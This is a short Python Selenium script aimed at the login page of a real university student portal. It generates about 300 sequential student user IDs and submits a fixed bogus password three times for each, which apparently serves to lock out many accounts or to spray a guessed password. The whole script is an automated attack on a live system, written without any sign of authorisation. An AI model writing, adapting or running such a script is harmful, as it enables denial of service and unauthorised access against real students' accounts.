from selenium import webdriver
from getpass import getpass


driver = webdriver.Chrome("C:\\Users\\muawi\\OneDrive\\Documents\\Study\\Zambeel\\chromedriver.exe")
driver.get("https://zambeel.lums.edu.pk/psp/ps/?cmd=login")
for i in range(0,300):
    userid = "241000" + str(i)
    if i == 52 or i == 48:
        continue
    for j in range(3):

        userid_textbox = driver.find_element(by="name", value="userid")
        userid_textbox.send_keys(userid)

        password_textbox = driver.find_element(by="id", value="pwd")
        password_textbox.send_keys("blaoo")

        login_button = driver.find_element(by="name", value="Submit")
        login_button.submit()

while(1):
    pass